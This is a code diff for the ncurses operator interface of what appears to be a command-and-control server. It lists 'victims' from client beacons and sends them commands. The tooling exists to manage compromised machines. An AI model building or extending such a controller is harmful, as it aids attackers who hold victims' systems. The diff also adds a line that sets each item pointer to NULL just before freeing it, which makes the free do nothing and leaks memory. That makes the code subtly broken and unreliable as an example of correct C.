@@ -151,6 +151,7 @@ bool ncurses_menu_cleanup(MENU *menu){
 
 bool ncurses_item_cleanup(ITEM **items, int n_items){
   for(int i = 0; i < n_items; ++i){
+    
     free_item(items[i]);
   }
   return true;
@@ -208,6 +209,7 @@ char *ncurses_victim_desc_1(char *s0, char *s1, char *s2, char *s3, char *s4, ch
 bool ncurses_item_victims(ITEM **items, net_client_beacon_t **p_victims){
   for(int i = 0; i < NET_MAX_CLIENTS; ++i){
     if (items[i] != NULL){
+      items[i] = NULL;
       free_item(items[i]);
     }
     int j = 0;
@@ -270,7 +272,7 @@ bool ncurses_wmain(int action, net_client_beacon_t **p_victims, net_server_beaco
     items = malloc(NET_MAX_CLIENTS * sizeof(ITEM));
   }
   if (action == NCURSES_WMAIN_UPDATE){
-    pthread_mutex_lock(&ncurses_mutex);
+    
     getmaxyx(win_main, y, x);
     wclear(win_main);
     wclear(win_menu);
@@ -281,7 +283,9 @@ bool ncurses_wmain(int action, net_client_beacon_t **p_victims, net_server_beaco
     box(win_main, 0, 0);
     ncurses_window_title(win_main, win_main_title);
     ncurses_window_footer(win_main, win_main_version);
+    pthread_mutex_lock(&ncurses_mutex);
     ncurses_item_victims(items, p_victims);
+    pthread_mutex_unlock(&ncurses_mutex);
     menu = new_menu(items);
     wmove(win_menu, 4, 2);
     wresize(win_menu, (y - (y_margin * 2)), (x - (x_margin * 2)));
@@ -298,7 +302,7 @@ bool ncurses_wmain(int action, net_client_beacon_t **p_victims, net_server_beaco
     refresh();
     wrefresh(win_main);
     wrefresh(win_menu);
-    pthread_mutex_unlock(&ncurses_mutex);
+    
   } 
   return false;
 }
@@ -320,6 +324,7 @@ void *ncurses_pthread_refresh(void *args){
       ncurses_wmain(NCURSES_WMAIN_UPDATE, p_args->p_victims, p_args->p_commands);
       n_victims = NET_VICTIMS_TOTAL;
       n_commands = NET_COMMANDS_TOTAL;
+      sleep(1);
     }
   }
   pthread_exit(NULL);
@@ -371,8 +376,6 @@ bool ncurses_main(){
       wrefresh(win_menu);
     }
     if (key == 10 || key == KEY_ENTER){
-      int y, x;
-      getmaxyx(win_main, y, x);
       ITEM *item;
       char uuid[SYS_UUID_SIZE];
       item = current_item(menu);
@@ -383,7 +386,6 @@ bool ncurses_main(){
       strcpy(p_net_server_beacon->uuid, uuid);
       strcpy(p_net_server_beacon->data, "TESTTESTTESTTEST");
       net_update_commands(p_net_server_beacon, p_commands);
-      //ncurses_wmain(NCURSES_WMAIN_UPDATE, p_victims, p_commands);
     }
   }
   ncurses_menu_cleanup(menu);
